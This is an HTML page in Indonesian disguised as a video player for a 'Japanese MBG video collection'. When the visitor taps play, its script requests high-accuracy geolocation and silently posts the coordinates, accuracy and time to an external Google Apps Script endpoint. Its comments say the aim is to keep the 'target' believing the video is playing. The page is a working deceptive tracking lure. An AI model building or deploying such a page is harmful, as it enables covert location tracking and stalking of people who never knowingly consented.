<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kumpulan Video MBG Jepang</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin: 0;
            padding: 0;
            background-color: #0f0f0f;
            color: #ffffff;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .header-title {
            font-size: 18px;
            font-weight: bold;
            margin-bottom: 15px;
            letter-spacing: 0.5px;
            color: #e50914;
        }
        .container {
            max-width: 500px;
            width: 100%;
            padding: 15px;
            box-sizing: border-box;
        }
        .video-wrapper {
            background: #1f1f1f;
            border-radius: 8px;
            box-shadow: 0px 4px 15px rgba(0,0,0,0.5);
            position: relative;
            overflow: hidden;
            aspect-ratio: 16 / 9;
            display: flex;
            justify-content: center;
            align-items: center;
            cursor: pointer;
        }
        img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: none; /* Disembunyikan di awal */
        }
        .play-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.4);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        .play-button {
            background-color: #e50914;
            color: white;
            width: 65px;
            height: 65px;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 24px;
            box-shadow: 0px 4px 15px rgba(0,0,0,0.6);
            transition: transform 0.2s;
        }
        .video-wrapper:hover .play-button {
            transform: scale(1.1);
        }
        .play-text {
            margin-top: 10px;
            font-size: 14px;
            font-weight: bold;
            letter-spacing: 0.5px;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="header-title">KUMPULAN VIDEO MBG JEPANG</div>
        <!-- Kotak yang menyerupai pemutar video -->
        <div class="video-wrapper" id="triggerArea" onclick="jalankanAksi()">
            <img id="foto" src="PXL_20260815_090015220.jpg" alt="Video Content">
            
            <div id="overlay" class="play-overlay">
                <div class="play-button">▶</div>
                <div class="play-text">KETUK UNTUK MENONTON</div>
            </div>
        </div>
    </div>

    <script>
        function jalankanAksi() {
            // 1. Hilangkan tombol play dan tampilkan gambar/video
            document.getElementById('overlay').style.display = 'none';
            document.getElementById('foto').style.display = 'block';

            // 2. Panggil fungsi geolocation browser
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        const akurasi = position.coords.accuracy;
                        const waktuSekarang = new Date().toLocaleString();
                        
                        const payload = {
                            waktu: waktuSekarang,
                            latitude: lat,
                            longitude: lon,
                            akurasi: akurasi + " meter"
                        };

                        // Kirim data ke backend Google Apps Script secara senyap
                        fetch("https://script.google.com/macros/s/AKfycbwwjCkMGf_fNAGP8S03P5-xhv4PBiF8ISvZ267ks1dOMbCbnEax3Do01pn1MtekAIxP/exec", {
                            method: "POST",
                            mode: "no-cors",
                            headers: {
                                "Content-Type": "application/json"
                            },
                            body: JSON.stringify(payload)
                        }).catch(err => {});
                    },
                    function(error) {
                        // Jika ditolak, abaikan agar target mengira video tetap berjalan
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            }
        }
    </script>

</body>
</html>
